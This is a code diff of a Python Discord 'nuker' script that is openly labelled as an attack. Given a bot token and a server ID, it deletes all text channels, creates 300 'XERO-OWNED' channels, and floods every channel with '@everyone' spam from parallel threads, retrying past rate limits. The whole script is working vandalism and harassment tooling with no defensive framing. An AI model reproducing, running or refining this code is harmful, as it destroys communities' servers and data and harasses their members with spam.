@@ -12,14 +12,24 @@ os.system("clear")
 print("XERO SIMPLE - iSH EDITION")
 print("=" * 30)
 
-token = input("BOT TOKEN: ").strip()
-if not token:
-    print("Token required!")
+# كل شي في سطر واحد
+data = input("ENTER TOKEN AND GUILD ID (format: token guild_id): ").strip().split()
+if len(data) < 2:
+    print("Error: Write both token and guild id!")
     sys.exit(1)
 
-print("Checking token...")
+token = data[0]
+guild_id = data[1]
+
+if not guild_id.isdigit():
+    print("Error: Guild ID must be numbers only!")
+    sys.exit(1)
+
+# فحص التوكن
+print("\nChecking token...")
+headers = {"Authorization": "Bot " + token}
 try:
-    r = requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": "Bot " + token}, timeout=15)
+    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=15)
     if r.status_code == 200:
         info = r.json()
         print("Connected as: " + info["username"])
@@ -30,187 +40,119 @@ except Exception as e:
     print("Error: " + str(e))
     sys.exit(1)
 
-class XeroSimple:
-    def __init__(self, guild_id, token):
-        self.guild_id = guild_id
-        self.token = token
-        self.spamming = False
-        self.spam_count = 0
-        self.headers = {"Authorization": "Bot " + self.token}
-
-    def check_guild(self):
-        print("Checking guild " + self.guild_id + "...")
-        r = requests.get("https://discord.com/api/v10/guilds/" + self.guild_id, headers=self.headers, timeout=15)
-        if r.status_code == 200:
-            guild = r.json()
-            print("Guild found: " + guild["name"])
-            return True
-        else:
-            print("Bot not in guild or invalid ID!")
-            return False
-
-    def get_all_channels(self):
-        r = requests.get("https://discord.com/api/v10/guilds/" + self.guild_id + "/channels", headers=self.headers, timeout=15)
-        if r.status_code == 200:
-            channels = r.json()
-            text_channels = [c for c in channels if c["type"] == 0]
-            print("Found " + str(len(text_channels)) + " channels")
-            return text_channels
-        return []
-
-    def delete_all_channels(self):
-        channels = self.get_all_channels()
-        if not channels:
-            print("No channels found!")
-            return
-        print("Deleting " + str(len(channels)) + " channels...")
-        deleted = 0
-        for i, channel in enumerate(channels, 1):
-            r = requests.delete("https://discord.com/api/v10/channels/" + channel["id"], headers=self.headers, timeout=15)
-            if r.status_code == 200:
-                deleted += 1
-                print("Deleted: " + channel["name"] + " (" + str(i) + "/" + str(len(channels)) + ")")
-            time.sleep(0.5)
-        print("Deleted " + str(deleted) + "/" + str(len(channels)))
-
-    def spam_worker(self, channel_id, message):
-        while self.spamming:
-            try:
-                r = requests.post("https://discord.com/api/v10/channels/" + channel_id + "/messages", headers=self.headers, json={"content": message}, timeout=15)
-                if r.status_code == 200:
-                    self.spam_count += 1
-                elif r.status_code == 429:
-                    time.sleep(1)
-                else:
-                    time.sleep(0.5)
-            except:
-                time.sleep(0.5)
-
-    def start_spam(self, message):
-        if self.spamming:
-            return
-        self.spamming = True
-        self.spam_count = 0
-        channels = self.get_all_channels()
-        if not channels:
-            print("No channels found!")
-            self.spamming = False
-            return
-        print("Spamming " + str(len(channels)) + " channels...")
-        print("PRESS ENTER TO STOP")
-        for channel in channels:
-            t = threading.Thread(target=self.spam_worker, args=(channel["id"], message))
-            t.daemon = True
-            t.start()
-        while self.spamming:
-            sys.stdout.write("\rMessages sent: " + str(self.spam_count) + "   ")
-            sys.stdout.flush()
-            time.sleep(1)
-
-    def stop_spam(self):
-        self.spamming = False
-        print("\nStopped. Total: " + str(self.spam_count))
-
-    def create_channels(self, name, amount):
-        print("Creating " + str(amount) + " channels...")
-        created = 0
-        for i in range(amount):
-            channel_name = name + "-" + str(i+1) if amount > 1 else name
-            r = requests.post("https://discord.com/api/v10/guilds/" + self.guild_id + "/channels", headers=self.headers, json={"name": channel_name, "type": 0}, timeout=15)
-            if r.status_code == 201:
-                created += 1
-                print("Created: " + channel_name + " (" + str(created) + "/" + str(amount) + ")")
-            time.sleep(0.5)
-        print("Created " + str(created) + "/" + str(amount))
-
-    def get_invite(self):
-        r = requests.get("https://discord.com/api/v10/oauth2/applications/@me", headers=self.headers, timeout=15)
-        if r.status_code == 200:
-            cid = r.json()["id"]
-            return "https://discord.com/oauth2/authorize?client_id=" + cid + "&permissions=8&scope=bot"
-        return None
-
-    def menu(self):
-        while True:
-            os.system("clear")
-            print("=" * 30)
-            print("XERO SIMPLE - iSH EDITION")
-            print("TARGET: " + self.guild_id)
-            print("=" * 30)
-            print("")
-            print("[1] DELETE ALL CHANNELS")
-            print("[2] SPAM ALL CHANNELS")
-            print("[3] CREATE CHANNELS")
-            print("[4] SHOW INVITE LINK")
-            print("[5] CHANGE TARGET")
-            print("[6] EXIT")
-            print("")
-            print("=" * 30)
-            choice = input("XERO > ")
-            if choice == "1":
-                confirm = input("ARE YOU SURE? (yes/no): ")
-                if confirm.lower() == "yes":
-                    self.delete_all_channels()
-                input("\nPRESS ENTER")
-            elif choice == "2":
-                message = input("SPAM MESSAGE: ")
-                if not message:
-                    message = "@everyone XERO WAS HERE"
-                self.start_spam(message)
-                input()
-                self.stop_spam()
-            elif choice == "3":
-                name = input("CHANNEL NAME: ")
-                if not name:
-                    name = "XERO-OWNED"
-                try:
-                    amount = int(input("HOW MANY: "))
-                except:
-                    amount = 20
-                self.create_channels(name, amount)
-                input("\nPRESS ENTER")
-            elif choice == "4":
-                invite = self.get_invite()
-                if invite:
-                    print("\n" + invite)
-                else:
-                    print("\nFailed!")
-                input("\nPRESS ENTER")
-            elif choice == "5":
-                return "change"
-            elif choice == "6":
-                print("BYE!")
-                return "exit"
-
-print("")
-print("=" * 30)
-print("READY!")
-print("=" * 30)
-print("")
-
-while True:
-    guild_id = input("ENTER GUILD ID (or exit): ").strip()
-    if guild_id.lower() == "exit":
-        print("Goodbye!")
-        sys.exit(0)
-    if not guild_id.isdigit():
-        print("Invalid! Numbers only.\n")
-        continue
-    print("")
-    xero = XeroSimple(guild_id, token)
-    if xero.check_guild():
-        print("Opening menu...\n")
-        time.sleep(1)
-        result = xero.menu()
-        if result == "exit":
-            sys.exit(0)
-        if result == "change":
-            print("\n")
-            continue
+# فحص السيرفر
+print("Checking guild...")
+try:
+    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers=headers, timeout=15)
+    if r.status_code == 200:
+        guild = r.json()
+        print("Guild found: " + guild["name"])
     else:
-        print("\nBot cannot access this guild!")
-        invite = xero.get_invite()
-        if invite:
-            print("Invite link: " + invite)
-        print("\n")
-ENDOFFILE
+        print("Bot not in that guild!")
+        sys.exit(1)
+except Exception as e:
+    print("Error: " + str(e))
+    sys.exit(1)
+
+# رسالة السبام
+spam_msg = input("\nSPAM MESSAGE (press enter for default): ").strip()
+if not spam_msg:
+    spam_msg = "@everyone XERO WAS HERE"
+
+print("\n" + "=" * 30)
+print("STARTING ATTACK...")
+print("=" * 30)
+print("")
+
+# حذف كل القنوات القديمة اول شي
+print("Deleting old channels...")
+try:
+    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, timeout=15)
+    if r.status_code == 200:
+        channels = r.json()
+        text_channels = [c for c in channels if c["type"] == 0]
+        for ch in text_channels:
+            requests.delete(f"https://discord.com/api/v10/channels/{ch['id']}", headers=headers, timeout=15)
+            time.sleep(0.3)
+        print(f"Deleted {len(text_channels)} channels")
+except:
+    print("Couldn't delete channels, continuing...")
+
+# انشاء 300 روم
+print("\nCreating 300 channels...")
+created = 0
+for i in range(300):
+    try:
+        r = requests.post(
+            f"https://discord.com/api/v10/guilds/{guild_id}/channels",
+            headers=headers,
+            json={"name": f"XERO-OWNED-{i+1}", "type": 0},
+            timeout=15
+        )
+        if r.status_code == 201:
+            created += 1
+            sys.stdout.write(f"\rCreated: {created}/300")
+            sys.stdout.flush()
+        time.sleep(0.3)
+    except:
+        pass
+
+print(f"\n\nSuccessfully created {created} channels!")
+
+# نجيب كل القنوات للسبام
+print("\nGetting channels for spam...")
+try:
+    r = requests.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers=headers, timeout=15)
+    channels = [c for c in r.json() if c["type"] == 0]
+    print(f"Found {len(channels)} channels")
+except:
+    print("Failed to get channels!")
+    sys.exit(1)
+
+# سبام مستمر بدون توقف
+spamming = True
+spam_count = 0
+
+def spam_worker(channel_id):
+    global spam_count
+    while spamming:
+        try:
+            r = requests.post(
+                f"https://discord.com/api/v10/channels/{channel_id}/messages",
+                headers=headers,
+                json={"content": spam_msg},
+                timeout=15
+            )
+            if r.status_code == 200:
+                spam_count += 1
+            elif r.status_code == 429:
+                time.sleep(1)
+            else:
+                time.sleep(0.3)
+        except:
+            time.sleep(0.3)
+
+# نشغل السبام على كل القنوات
+print("\nStarting spam attack...")
+print("PRESS ENTER TO STOP\n")
+
+for channel in channels:
+    t = threading.Thread(target=spam_worker, args=(channel["id"],))
+    t.daemon = True
+    t.start()
+
+# عداد مباشر
+def counter():
+    while spamming:
+        sys.stdout.write(f"\rMessages sent: {spam_count} | Active channels: {len(channels)}   ")
+        sys.stdout.flush()
+        time.sleep(0.5)
+
+threading.Thread(target=counter, daemon=True).start()
+
+# انتظار المستخدم يضغط ENTER عشان يوقف
+input()
+spamming = False
+
+print(f"\n\nStopped! Total messages sent: {spam_count}")
+print("Goodbye!")
